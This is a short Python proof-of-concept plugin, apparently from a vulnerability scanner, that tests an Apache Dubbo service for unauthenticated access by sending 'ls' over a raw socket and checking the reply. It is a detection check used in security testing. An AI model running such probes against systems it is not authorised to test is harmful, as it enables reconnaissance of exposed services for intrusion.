#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import socket
from script import Script, SERVER_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.server_type = SERVER_PORT_MAP.DUBBO
        self.name = 'dubbo unauth'
        self.keyword = ['dubbo','unauth']
        self.info = 'dubbo unauth'
        self.type = 'unauth'
        self.level = 'high'
        Script.__init__(self, target=target, server_type=self.server_type)

    def prove(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((self.target_host, self.target_port))
            s.sendall(bytes('ls\r\n\r\n','utf-8'))
            message = str(s.recv(1024))
            s.close()
            if 'com.alibaba.dubbo' in message:
                self.flag = 1
                self.req.append({"info": "ls"})
                self.res.append({"info": "dubbo unauth", "key":"ls","dubbo_ls": message})
        except socket.timeout:
            pass
        except Exception :
            pass